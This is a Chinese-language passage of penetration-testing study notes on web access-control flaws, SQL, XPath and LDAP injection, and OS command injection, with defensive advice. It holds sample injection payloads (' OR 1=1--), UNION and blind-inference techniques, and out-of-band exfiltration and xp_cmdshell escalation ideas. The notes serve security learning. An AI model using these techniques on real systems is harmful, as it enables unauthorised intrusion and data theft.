<h3 id="通过有限访问权限进行测试"><a href="#通过有限访问权限进行测试" class="headerlink" title="通过有限访问权限进行测试"></a>通过有限访问权限进行测试</h3><p>应用程序通常有一些隐藏的功能没有体现在界面中，但是却有可能可以访问；</p>
<blockquote>
<h4 id="渗透测试步骤-40"><a href="#渗透测试步骤-40" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用第4章的枚举尽可能多的功能；</li>
<li>如果确信应用程序可能会朋管理员的界面功能，可考虑在请求参数中增加 admin&#x3D;true 之类的字符，确定是否可以访问一些普通用户访问不到的功能；</li>
<li>检查应用程序是否基于 Referer 消息头进行访问控制；尝试删除 Referer 字段值，看是否应用程序会做出不同的反应，如果会的话，说明漏洞可能存在；</li>
<li>检查所有的客户端 HTML 与 JS 脚本，查找有没有隐藏的功能，或者可从客户端进行操纵的功能的引用；</li>
</ul>
</blockquote>
<p>在枚举出应用程序的所有功能后，开始测试应用程序是否正确的对资源进行访问控制；如果应用程序允许用户访问一组内容广泛的相同类型的资源，则用户有机会访问那些未授权的资源；</p>
<blockquote>
<h4 id="渗透测试步骤-41"><a href="#渗透测试步骤-41" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>尝试找到没有权限访问的资源的标识符；</li>
<li>如果有可能生成一系列紧密相连的标识符的话，则可以使用与会话令牌类似的技巧，尝试查找标识符的生成规律；</li>
<li>如果无法生成标识符，则只能通过分析现有的标识符来查找规律；如果标识符的位数比较少，则有可能成功；如很大则很难；</li>
<li>如果资源标识符可以预测，而且访问控制没做好，则可以使用自动化的工具快速获取敏感资源和信息；</li>
</ul>
</blockquote>
<blockquote>
<p>如果服务端有将密码发送到客户端，即使不显示，也将是非常危险的，因为只要枚举用户名，就可以获得密码了；</p>
</blockquote>
<h3 id="测试“直接访问对象的方法”"><a href="#测试“直接访问对象的方法”" class="headerlink" title="测试“直接访问对象的方法”"></a>测试“直接访问对象的方法”</h3><p>如果应用程序允许客户端直接调用服务端某个对象的方法（通常表现为传递对象的名称），例如 servlet&#x3D;com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug；</p>
<blockquote>
<h4 id="渗透测试步骤-42"><a href="#渗透测试步骤-42" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确定任何遵循 Java 命名约定（例如 get, set, add, update, is, has+大写单词等），或明确指定包结构（如 com.companname.xxx.yyy.Classname）的参数；</li>
<li>找到列出对象所有方法的方法；先看该方法是否被调用，如果没有，则尝试猜测它的名称；</li>
<li>上网搜索一下相关的方法名称；</li>
<li>猜测其他可用方法的名称；</li>
<li>常用使用各种账户访问收集到的所有方法；</li>
<li>如果不知某个方法的参数数量和类型，则可以先找那些不需要参数的方法；</li>
</ul>
</blockquote>
<h3 id="测试对静态资源的控制"><a href="#测试对静态资源的控制" class="headerlink" title="测试对静态资源的控制"></a>测试对静态资源的控制</h3><p>如果某些静态资源可以直接使用 URL 访问，则应该测试一下使用未授权账户是否也能够访问这些资源；</p>
<blockquote>
<h4 id="渗透测试步骤-43"><a href="#渗透测试步骤-43" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>先正常步骤访问某个静态资源，看最终能够获取到它的 URL；</li>
<li>使用权限较低或无权访问该资源的账户，对该 URL 发起请求，看能否成功；</li>
<li>如果可以成功，则开始猜测静态资源的命名方式；尝试设计一个自动枚举名称的脚本，进行自动攻击，获取所有可能有用或可能包含敏感数据的资源；</li>
</ul>
</blockquote>
<h3 id="测试对-HTTP-方法实施的限制"><a href="#测试对-HTTP-方法实施的限制" class="headerlink" title="测试对 HTTP 方法实施的限制"></a>测试对 HTTP 方法实施的限制</h3><p>应用程序有可能并没有 HTTP 方法实施平台级控制；</p>
<blockquote>
<h4 id="渗透测试步骤-44"><a href="#渗透测试步骤-44" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用一个权限较高的账户登录，执行一些需要高操作权限的动作，例如添加用户、更改用户角色等功能；</li>
<li>确定这些操作是否有受到任何反 CSRF 令牌或类似功能的保护，如果 HTTP 的方法被修改，应用程序是否仍然能够完成请求的内容；待测试的方法包括：GET, POST, HEAD，以及任何无效的 HTTP 方法；</li>
<li>如果应用程序会执行用不同方法提交的请求，则使用低权限的账户，再次进行测试；</li>
</ul>
</blockquote>
<h2 id="保障访问控制的安全"><a href="#保障访问控制的安全" class="headerlink" title="保障访问控制的安全"></a>保障访问控制的安全</h2><ul>
<li>仔细评估应用程序每个功能单元的访问控制要求，包括谁能访问这些功能，以及用户通过这些功能能够访问哪些资源；</li>
<li>使用用户会话做出所有访问控制决定；</li>
<li>使用一个单独的组件检查访问控制；通过这个组件处理所有的每一个客户端请求，确认用户访问的资源是被允许的；</li>
<li>使用编程技巧确保前两项没有例外；例如规定每个页面的访问控制都必须通过公用组件来处理；</li>
<li>对于特别敏感的功能，例如管理员页面，可以增加 IP 地址的限制，确保只有内网中的用户可以访问该功能；</li>
<li>对于静态内容，有两种控制方法，一是通过让客户端传送文件名参数，由后端处理后，间接访问静态文件；二是使用 HTTP 验证，在允许访问前检查资源许可；</li>
<li>任何时候通过客户端传送的资源标识符，都需要对其授权重新确认；</li>
<li>对于安全性很高的功能，考虑对操作进行双重验证，进一步确认该功能举动被未授权方使用；</li>
<li>记录每一个访问敏感数据或执行敏感操作的事件，以便后续检测并调查潜在的非法访问事件；</li>
</ul>
<h3 id="多层权限模型"><a href="#多层权限模型" class="headerlink" title="多层权限模型"></a>多层权限模型</h3><p>除了对应用程序实施良好的访问控制实践，也应将这些实践或思路使用到基础设施中，例如：应用程序服务器、数据库、操作系统等；</p>
<ul>
<li>数据库应增加多个账户，有些账户只有查询的权限，供应用程序中仅需查询的功能使用；</li>
<li>应在数据库中增加一个权限表，对数据库中不同的数据库表执行严格的访问控制；</li>
<li>只给每个操作系统账户分配最低权限，仅能运行所需的组件即可；</li>
</ul>
<p>对于需要复杂权限的应用程序，应该设计一张权限矩阵表，进行清晰化的控制，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195257.png"></p>
<h4 id="常见的访问控制概念"><a href="#常见的访问控制概念" class="headerlink" title="常见的访问控制概念"></a>常见的访问控制概念</h4><ul>
<li>编程控制：将数据库权限矩阵保存在一个数据库表中，并以编程的形式做出访问控制决定；</li>
<li>自主访问控制：由管理员分配资源权限给其他用户，分配规则可以是封装式（白名单），也可以是开放式的（黑名单）</li>
<li>基于角色的访问控制：创建很多命名的角色，给用户分配角色；使用角色对用户的请求进行检查；</li>
<li>声明式控制：应用程序使用有限的数据库账户访问数据库，每个账户仅分配到执行所允许操作的最低权限；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-45"><a href="#渗透测试步骤-45" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>虽然使用多层控制模型的应用程序可以避免很多常见的访问控制漏洞，但是仍然有一些潜在的漏洞</p>
<ul>
<li>应用程序的源代码有可能容易受到注入类的攻击；</li>
<li>角色定义不全面或不完整；</li>
<li>低权限的操作系统账户仍然可以访问敏感数据；</li>
<li>应用程序服务器软件本身存在漏洞；</li>
<li>某个小漏洞可能成为实现权限大提升的突破点；</li>
</ul>
</blockquote>
<h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>许多时候，突破访问控制非常容易；有时在一些高度安全的应用中则很难；“四处看看”是攻击访问控制的最有效方法，如果能够耐心的测试应用程序的每一项功能，也许不久就可以发现一个能攻破整个应用程序的漏洞；</p>
<h1 id="9-攻击数据存储区"><a href="#9-攻击数据存储区" class="headerlink" title="9. 攻击数据存储区"></a>9. 攻击数据存储区</h1><h2 id="注入解释型语言"><a href="#注入解释型语言" class="headerlink" title="注入解释型语言"></a>注入解释型语言</h2><p>如果使用普通用户登录进行查询，然后使用数据库语言进行注入攻击，有可能直接绕开应用程序的访问控制检查；</p>
<blockquote>
<h4 id="渗透测试步骤-46"><a href="#渗透测试步骤-46" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>提交可能在解释型语言中引发问题的无效语法；</li>
<li>检查应用程序的响应，看是否存在代码注入漏洞的反常现象；</li>
<li>如果收到错误消息，从中获取服务端发生某种问题的证据；</li>
<li>系统性的修改初始输入，尝试确定或否定之前的漏洞假设；</li>
<li>构造一个漏洞验证框架，以可证实的方式执行某些安全的命令，收集证据，检查是否存在漏洞；</li>
<li>利用目标语言和组件的功能来实现攻击，对其中已公开的漏洞加以利用；</li>
</ul>
</blockquote>
<h2 id="注入-SQL"><a href="#注入-SQL" class="headerlink" title="注入 SQL"></a>注入 SQL</h2><p>如果在本地安装一个与目标应用程序相同的数据库的话，会提高注入的效率，因为很多注入命令可以先在本地数据库进行尝试，观察并结合本地数据库的返回结果，之后再去猜测目标服务器的结果会更容易理解其内部发生的情况；</p>
<h3 id="利用一个基本的漏洞"><a href="#利用一个基本的漏洞" class="headerlink" title="利用一个基本的漏洞"></a>利用一个基本的漏洞</h3><p>基本原理是利用 SQL 解释型语言动态解释 SQL 语句的特点，在查询参数中添加单引号、注释符等在 SQL 中有意义的关键符号，使得语句进入解释器后，执行不同的查询操作；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 输入项为 &quot;Reilly&quot;</span><br><span class="line"><span class="keyword">SELECT</span> author, title, <span class="keyword">year</span>  <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> publisher<span class="operator">=</span><span class="string">&#x27;Reilly&#x27;</span> <span class="keyword">and</span> published<span class="operator">=</span><span class="number">1</span></span><br><span class="line"># 修改输入项为 Reilly<span class="string">&#x27; OR 1=1--，查询语句变成如下</span></span><br><span class="line"><span class="string">SELECT author, title, year  FROM books WHERE publisher=&#x27;</span>Reilly<span class="string">&#x27; OR 1=1--&#x27;</span> <span class="keyword">and</span> published<span class="operator">=</span><span class="number">1</span></span><br><span class="line"># 修改输入项为 Reilly<span class="string">&#x27; OR &#x27;</span>a<span class="string">&#x27; = &#x27;</span>a，查询语句变成如下</span><br><span class="line"><span class="keyword">SELECT</span> author, title, <span class="keyword">year</span>  <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> publisher<span class="operator">=</span><span class="string">&#x27;Reilly&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> published<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="注入不同的语句类型"><a href="#注入不同的语句类型" class="headerlink" title="注入不同的语句类型"></a>注入不同的语句类型</h3><h4 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h4><p>用来查询数据，一般配合 WHERE 使用；</p>
<h4 id="INSERT-语句"><a href="#INSERT-语句" class="headerlink" title="INSERT 语句"></a>INSERT 语句</h4><p>用于插入数据行，攻击可利用漏洞来为自己创建管理员账户；有时不知道插入值需要多少个参数，此时需要挨个添加（添加整数1或2000），并进行测试；</p>
<h4 id="UPDATE-语句"><a href="#UPDATE-语句" class="headerlink" title="UPDATE 语句"></a>UPDATE 语句</h4><p>用于修改表中一行或多行的数据；UPDATE 与 INSERT 很像，区别在于多了 WHRER 部分来指定待更新的行；</p>
<p>对 UPDATE 的漏洞进行探查有很大的风险，因为它很有可能一不小心就修改了数据库里面的很多数据；</p>
<h4 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h4><p>用于删除表中一行或者几行的数据；运行机制很像 UPDATE 语句，它同样也有很大的破坏当前数据库的风险；</p>
<h3 id="查明-SQL-注入漏洞"><a href="#查明-SQL-注入漏洞" class="headerlink" title="查明 SQL 注入漏洞"></a>查明 SQL 注入漏洞</h3><p>正常情况下，所有提交给服务端的参数，最终可能都会传递到数据库函数进行处理；因此，通过检查这些提交的数据项，发现可能存在的漏洞；</p>
<p>有时候应用程序会从多个请求中收集数据，待收集完整后，才会写入数据库，因此，如果有多阶段的过程，需要对该功能发送的所有数据进行遍历；如果只处理单个请求，则可能会遗漏漏洞；</p>
<h4 id="注入字符串数据"><a href="#注入字符串数据" class="headerlink" title="注入字符串数据"></a>注入字符串数据</h4><p>渗透测试步骤</p>
<ul>
<li>提交一个单引号作为目标查询的数据，观察是否会造成错误，或查询结果与原始结果不同；</li>
<li>如果发现错误或者异常行为，在提交的数据中包含两个单引号（连着，单引号的转义），看会如何反应；如果错误或异常消失，则表明很可能有注入漏洞；</li>
<li>使用 SQL 连接符，在提交的数据中增加一个等同于正常输入的字符串，来进一步核实漏洞是否存在；不同数据库软件的连接符不同：<ul>
<li>MySQL: ‘ ‘FOO  （注：两个引号之间有空格）</li>
<li>MS-SQL: ‘+’FOO</li>
<li>Oracle: ‘||’FOO</li>
</ul>
</li>
</ul>
<blockquote>
<p>可在特定的查询参数中使用 SQL 通配符 %，看是否会返回更多的结果，如果是的话，说明提交的数据正与后端数据库交互；</p>
</blockquote>
<p>在提交的输入中添加单引号后，如果服务端返回这个输入的话，会导致客户端的 js 脚本在处理它时出现报错；因为单引号在 js 里面也一个关键字符；</p>
<h4 id="注入数字数据"><a href="#注入数字数据" class="headerlink" title="注入数字数据"></a>注入数字数据</h4><p>一般情况下，当数字参数传输到服务端时，一般应用程序会将其加单引号处理，但有时候也有可能没有处理，直接发给数据库软件；</p>
<p>渗透测试步骤：</p>
<ul>
<li>尝试输入一个运算结果等于原始结果的算术表达式，例如原始值为2，则输入 3-1，或者 1+1；如果应用程序仍然能够正常反应，则存在注入漏洞；</li>
<li>如果前面的方法取得成功，则接下来可以使用更加复杂和特殊的 SQL 关键字和语法的表达式进一步探查该漏洞，例如使用 ASCII 命令来将字符或数字转成数值类型的 ASCII 码，例如 67-ASCII(A）等同于 67-65，也即等于2；</li>
<li>如果单引号被过滤掉，则前面的方法可能无效；此时可以利用数据库会解析 ASCII 命令的特点，例如：51-ASCII(1) 等于 51-49，也即等于2；</li>
</ul>
<p>在使用特殊字符探查 SQL 注入漏洞时，需要提前留意一点，即输入是需要先被 HTML 编码之后，才会传输到服务端时，因此我们还需要将字符进一步转为 HTML 编码，才能达到预期的目标；</p>
<ul>
<li>&amp; 和 &#x3D; 在 HTML 中应该以 %26 和 %3d 来表示；</li>
<li>查询字符串不允许有空格，因此空格需要使用 %20 或者 + 来表示；</li>
<li>如果要在字符串中使用 + ，则需要使用 %2b 对其编码；例如：1+1 应以 1%2b1 进行提交；</li>
<li>分号用于分隔 cookie 字段，需要使用 %3b 对其编码；</li>
</ul>
<h4 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h4><p>在 SQL 语句中，有一些关键字，例如：ORDER BY, WHERE 等，这些关键字跟着一些列名，来达到预期的目标；而这些列名在有些应用程序中是由客户端提交的数据来指定的；</p>
<p>渗透测试步骤</p>
<ul>
<li>记下任何可能控制应用程序返回的结果的顺序，或者结果的类型的参数；</li>
<li>提交一系列在参数值中使用数字值的请求，从数字1开始，然后逐个请求递增；<ul>
<li>如果更改的数字会影响结果的顺序，则说明输入很可能被用于 ORDER BY 子句中，因为在 ORDER BY 之后的数字，表示按第几列进行排序；如果数字超过了总列数，则查询会失败；在数字后面使用 ASC – 或者 DESC – 来观察返回的结果是否顺序会变化；</li>
<li>如果提交的数字 1 生成一组结果，其中有一列都包含该数字，则表示该数字被用于插入到返回的结果的某一列中；即 SELECT 1, title, year FROM books WHERE publisher&#x3D;’Willy’</li>
</ul>
</li>
</ul>
<blockquote>
<p>虽然在 ORDER BY 之后接的是列名称，因此不能再注入 UNION, WHERE, OR, AND 等关键字，但可以指定一个嵌套查询来实现注入；</p>
</blockquote>
<h3 id="“指纹”-识别数据库"><a href="#“指纹”-识别数据库" class="headerlink" title="“指纹” 识别数据库"></a>“指纹” 识别数据库</h3><p>根据数据库使用哪种连接符，可以判断其使用的哪一种数据库；将原本某个正常的字符串参数，改成由连接符连接的格式，看服务端能否正常返回结果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210194833.png"></p>
<p>对于数字格式的参数，使用以下攻击字符串来识别，它在匹配的数字库中表示 0，在不匹配的数据库中则会出现错误；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210194951.png"></p>
<p>MySQL 在处理行内注释时，有一个特点，当行内注释以感叹号 ！开头时，表示进行版本号的判断，如果当前数据库的版本号大于等于注释中的版本号，则注释中的内容会被解析和执行；因此可以利用这一点，插入相应的语句，来识别数据库的版本，例如：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195019.png"></p>
<h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h3><p>SQL 使用 UNION 将两个或多个的 SELECT 语句的查询结果合并起来；如果一个 SELECT 语句出现漏洞，意味着可以使用 UNION 来执行另一次完全独立的查询，并将其结果和第一次的查询结果组合到一起；</p>
<p>但是 UNION 也有一些限制：</p>
<ul>
<li>查询结果的列数需要是相同的；每列的数据类型需要是兼容的；</li>
<li>需要知道另一个表的名称和列的名称；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-47"><a href="#渗透测试步骤-47" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>先查明所需的列数；利用 NULL 被转换为任何数据类型的这一特点，逐个增加 NULL 直到查询被执行；</li>
<li>第二项任务是找到一个数据类型为字符串的列，使用 ‘a’ 逐个取代一个 NULL，如果查询得到执行，将看到另一行包含 a 值的数据，然后可以使用相关列从数据库中提取数据；</li>
</ul>
</blockquote>
<h3 id="提取有用的数据"><a href="#提取有用的数据" class="headerlink" title="提取有用的数据"></a>提取有用的数据</h3><p>想获得有用的数据，需要知道列的名称；而列的名称经常保存在数据库元数据的表中（例如 MS-SQL 中的 information_schema.columns），通过查询该表来获得表和列的名称；</p>
<h3 id="使用-UNION-提取数据"><a href="#使用-UNION-提取数据" class="headerlink" title="使用 UNION 提取数据"></a>使用 UNION 提取数据</h3><ul>
<li>使用 NULL 找到列数；</li>
<li>查找元数据表，得到表名称和列名称；</li>
<li>开始提取数据</li>
</ul>
<h3 id="避开过滤"><a href="#避开过滤" class="headerlink" title="避开过滤"></a>避开过滤</h3><h4 id="避免使用被阻止的字符"><a href="#避免使用被阻止的字符" class="headerlink" title="避免使用被阻止的字符"></a>避免使用被阻止的字符</h4><ul>
<li>使用 SQL 的内置函数来动态构建字符串，</li>
<li>如果注释符号被净化，可以设计为真的表达式；</li>
</ul>
<h4 id="避免使用简单确认"><a href="#避免使用简单确认" class="headerlink" title="避免使用简单确认"></a>避免使用简单确认</h4><p>有时候应用程序使用黑名单来净化，则是可以将注入的数据用复杂一些的表达式，例如：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195046.png"></p>
<h4 id="使用-SQL-注释"><a href="#使用-SQL-注释" class="headerlink" title="使用 SQL 注释"></a>使用 SQL 注释</h4><p>SQL 允许在行内插入注释，这意味着可以利用这个特性来避开净化，或者冒充空格；</p>
<h4 id="利用有缺陷的过滤"><a href="#利用有缺陷的过滤" class="headerlink" title="利用有缺陷的过滤"></a>利用有缺陷的过滤</h4><p>应用程序有可能没有使用递归的方式来过滤，因此可以增加一个外层骗过它；</p>
<h3 id="二阶-SQL-注入"><a href="#二阶-SQL-注入" class="headerlink" title="二阶 SQL 注入"></a>二阶 SQL 注入</h3><p>有些应用程序允许用户的输入项中包含特殊的字符，当输入到达服务端时，应用程序会对其进行转义，这会导致注入失去效果；但是此时存在一些微妙的问题，存入数据库的特殊字符被转义了，但当下次它被查询并取出来的时候，有可能没有适当处理，然后可能再次帮为参数参加其他的 SQL 查询，此时将触发一个漏洞；</p>
<p>原理：将 SQL 注入语句先做为正常值存起来，然后再调用查询的命令将把它取出来，从而触发注入；</p>
<h3 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h3><p>有些攻击者不一定使用注入来获取数据，它甚至有时候用来破坏数据库；</p>
<h4 id="获取数字数据"><a href="#获取数字数据" class="headerlink" title="获取数字数据"></a>获取数字数据</h4><p>可利用 ASCII 和 SUBSTRING 两个函数将字符转成数字；这样如果想得到一串数字，可以用字符串转化并拼接出来；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195105.png"></p>
<h4 id="使用带外通道"><a href="#使用带外通道" class="headerlink" title="使用带外通道"></a>使用带外通道</h4><p>虽然有时候可以实现注入查询，但是查询的结果却不一定被应用程序返回给浏览器，但是可以利用数据库的内置功能，让它与攻击者设立的目标数据库建立连接，将查询结果传输到攻击者创建的数据库；</p>
<ul>
<li>MS-SQL 的 openrowset 功能；</li>
<li>Oracle 的各种包，包括 UTL_HTTP 、UTL_INADDR、UTL_SMTP、UTL_TCP；</li>
<li>MySQL 的 INTO OUTFIL 命令可以将结果写入一个文件，通过在两台计算之间建立 SMB 共享，可以实现文件的匿名写入；</li>
</ul>
<p>另外通过提升数据库权限，还可以利用操作系统的功能来和外部建立连接以传送数据；</p>
<h4 id="使用推论：条件式响应"><a href="#使用推论：条件式响应" class="headerlink" title="使用推论：条件式响应"></a>使用推论：条件式响应</h4><p>由于防火墙的关系，有时候带外通道并一定能够成功；此时还有另外一种比较费劲的办法，即通过设置不同的查询条件，应用程序会出现不一样的行业，来判断自己所猜测的信息是否是命中了；例如让数据库报错，此时应用程序有可能会返回 500 的错误，从而得到反馈；</p>
<p>SELECT X FROM Y WHERE C，当条件 C 满足时，才会求 X 表达式的值，如果 C 不满足，则不会触发 X 表达式的计算；此时，我们可以设置 X 表达式为一个求值会报错的表达式，例如进行除零云计算，这样我们就可以在 C 中放置我们想探查的信息，如果查询成功，就会触发报错；如果查询失败，则不会触发报错；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195128.png"></p>
<p>我们可以逐个字节的探查猜测是否正确，例如对于字符串类型的用户名，我们可以探查第一个字母是否为 A，如果不是就看是否为 B，以此类推；当猜测出来后，再开始探查第二个字母，不断循环；使用这种方法可以探查数据库中的每一条记录；</p>
<h4 id="使用时间延迟"><a href="#使用时间延迟" class="headerlink" title="使用时间延迟"></a>使用时间延迟</h4><p>猜测的依据除了建立在应用程序是否报错的基础上，也可以建立在应用程序的响应时间上；例如不同数据库有内置不同的延迟命令，可以调取这个命令来制造时间延迟；有些数据库没有时间延迟函数，这时可以让它作一次密集运算，或者让它连接一个不存在的服务器来增加延迟；</p>
<h4 id="SQL-注入之外：扩大数据库攻击范围"><a href="#SQL-注入之外：扩大数据库攻击范围" class="headerlink" title="SQL 注入之外：扩大数据库攻击范围"></a>SQL 注入之外：扩大数据库攻击范围</h4><p>除了应用程序外，数据库本身也是存在漏洞的；因此，除了攻击应用程序本身，还可以通过攻击数据库服务器来达到相同的目的；</p>
<h5 id="MS-SQL"><a href="#MS-SQL" class="headerlink" title="MS-SQL"></a>MS-SQL</h5><p>MS-SQL 有一个内置的 xp__cmdshell 功能，可以使用数据库账户执行系统级的命令，中，虽然默认情况下，该功能是关闭的，但是如果应用程序的账户拥有足够大的权限，则它可以通过开启这项功能，然后利用它来完全控制数据库服务器的操作系统；</p>
<h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><p>Oracle 的漏洞更多，只要通过实现 SQL 注入，就大概率可以利用其漏洞控制整个数据库；</p>
<h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><p>与前面两个数据库相比，MySQL 中可用攻击者利用的内置功能相对比较少；MySQL 允许读取或写入文件到文件系统中；因此如果数据库账户拥有 FILE_PRIV 权限，则可以打开相关文件访问数据库中的任何数据；</p>
<p>另外 MySQL 允许用户打开动态库文件，因此攻击者可提前创建一个能够实现自己目的的二进制文件，然后通过 MySQL 去读取它，间接实现命令的执行；</p>
<h3 id="使用-SQL-注入工具"><a href="#使用-SQL-注入工具" class="headerlink" title="使用 SQL 注入工具"></a>使用 SQL 注入工具</h3><p>探测 SQL 注入漏洞的过程需要提交大量的请求，目前已经有这方面的自动化工具，但这些工具还没有达到智能化的程度，在使用前，需要攻击者做一些设置，才能够更有效的提高攻击效率和成功率；</p>
<h3 id="SQL-语法与错误参考"><a href="#SQL-语法与错误参考" class="headerlink" title="SQL 语法与错误参考"></a>SQL 语法与错误参考</h3><h4 id="SQL-语法"><a href="#SQL-语法" class="headerlink" title="SQL 语法"></a>SQL 语法</h4><p>不同的数据库语法之间有一些差别，因此需要因地制宜，使用匹配后端数据库的语法；</p>
<h4 id="SQL-错误消息"><a href="#SQL-错误消息" class="headerlink" title="SQL 错误消息"></a>SQL 错误消息</h4><p>不同的数据库其报错的消息格式和内容也不一样，并且这些报错消息意味着不同的漏洞可能性；</p>
<h3 id="防止-SQL-注入"><a href="#防止-SQL-注入" class="headerlink" title="防止 SQL 注入"></a>防止 SQL 注入</h3><h4 id="部分有效的防御措施"><a href="#部分有效的防御措施" class="headerlink" title="部分有效的防御措施"></a>部分有效的防御措施</h4><ul>
<li>对用户输入的所有单引号进行配对；</li>
<li>使用存储过程；</li>
</ul>
<h4 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h4><ul>
<li>指定查询结构，预留占位符；</li>
<li>指定每个占位符的内容；</li>
</ul>
<h4 id="深层防御"><a href="#深层防御" class="headerlink" title="深层防御"></a>深层防御</h4><ul>
<li>当应用程序访问数据库时，应尽量采用最低权限的账户；</li>
<li>尽量删除或禁用数据库的那些不必要的功能；内置功能越强大越多，漏洞也越多；</li>
<li>及时安装数据库软件的补丁；</li>
</ul>
<h2 id="注入-NoSQL"><a href="#注入-NoSQL" class="headerlink" title="注入 NoSQL"></a>注入 NoSQL</h2><p>NoSQL 虽然是非关系型数据库的统称，但是其实涵盖很多种类型的数据库，每一种数据库的使用方式都完全不同，因此针对不同的 NoSQL 数据库需要使用不同的攻击方法；</p>
<blockquote>
<p>作者在写作这本书的时候，这方面的研究才刚开始，但现在这个阶段估计应该有一些成功的办法了；</p>
</blockquote>
<h2 id="注入-XPath"><a href="#注入-XPath" class="headerlink" title="注入 XPath"></a>注入 XPath</h2><p>XPath 是一个处理 XML 文档的工具，用来从 XML 文档中读取或写入数据；但是 XML 并不是保存应用程序数据的传统方式，它一般用来保存一些配置类型的数据为主，或一些简单的信息，例如角色、权限等；</p>
<p>XPath 注入的方式跟 SQL 差不多，例如都同样可以使用条件判断逐个字节的获得信息；XPath 同样也有一些内置的函数可供利用；</p>
<p>有时候我们并不知道后面是否使用 XPath，但如果发现某个 SQL 漏洞，但却无法加以利用，则应考虑一下 XPath 的可能；</p>
<h2 id="注入-LDAP"><a href="#注入-LDAP" class="headerlink" title="注入 LDAP"></a>注入 LDAP</h2><p>LDAP 是 lightweight directory access protocol 的简称，表示轻量级的访问协议，它用来提供访问网络中的目录；</p>
<p>LDAP 使用一些逻辑运算符来做条件判断；由于它独特的语法形式，常规的 SQL 注入技巧在 LDAP 并不适用；通常来说， LDAP 的注入难度更大一些；不过如果结合其语法来提交输入，也是存在注入的可能； </p>
<p>LDAP 在处理 NULL 字节方面存在漏洞，该单词在 LDAP 表示字符串终止；攻击者可以利用这个漏洞，达到和 SQL 的注释符相同的效果；</p>
<h2 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h2><p>本章提到的攻击方式只是注入攻击的冰山一角，如果攻击者利用这类漏洞，将能够在服务器的操作系统上执行命令、检查任意文件，即利用应用程序的漏洞攻破并控制为应用程序提供环境的组件；</p>
<h1 id="10-攻击后端组件"><a href="#10-攻击后端组件" class="headerlink" title="10. 攻击后端组件"></a>10. 攻击后端组件</h1><p>一般来说，很多 Web 应用程序被作为后端服务的中间层，客户端通过访问这个中间层，间接实现对服务器上其他底层组件（例如文件系统）和进程的访问；虽然 Web 应用程序本身设置了安全机制，但是对于应用程序来说安全的数据，有可能对于底层组件来说并不是安全的。攻击者有可能利用该漏洞，绕过应用程序的检查，实现对底层组件的调用和控制；</p>
<h2 id="注入操作系统命令"><a href="#注入操作系统命令" class="headerlink" title="注入操作系统命令"></a>注入操作系统命令</h2><p>有些应用程序会基于用户的输入，生成相应的命令，发送给操作系统执行，这将可能被攻击者利用的漏洞，因为可以设计专门的输入，修改开发者想要执行的命令；这类漏洞特别经常出现在为内部人员提供管理服务器的界面的应用程序中，因为这类管理需求需要直接跟操作系统打交道；</p>
<p>有些命令使用的是字符串拼接的方式，然后发给脚本语言本身提供的系统调用函数来执行；有些脚本语言使用 eval 函数将字符串解析为待执行的代码；</p>
<h3 id="查找-OS-命令注入漏洞"><a href="#查找-OS-命令注入漏洞" class="headerlink" title="查找 OS 命令注入漏洞"></a>查找 OS 命令注入漏洞</h3><p>不同的 shell 解释器有不同的字符处理方式，应用程序调用的 shell 有很多种可能性，因此需要先想方法对假设进行验证；</p>
<p>可在原命令中注入新命令的字符：</p>
<ul>
<li>;  |  &amp; 等三个字符可用于将几个命令连接起来；而且在不同的 shell 解释器中，成对使用它们可达到不同的效果；</li>
<li>反引号 &#96; 可用于将一个独立的命令包含在最初命令处理的数据中；例如把一个注入命令放在反引号中，shell 就会先执行该命令，然后用执行的结果代替被反引号包含的文本，然后执行替代后的新命令字符串；</li>
</ul>
<blockquote>
<p>注入命令的一个常见问题是执行的结果并不会返回，因此并不知道注入是否成功，但是只要漏洞存在，就会有一些探查的方法，例如通过时间延迟来判断；</p>
</blockquote>
<p>渗透测试步骤</p>
<ul>
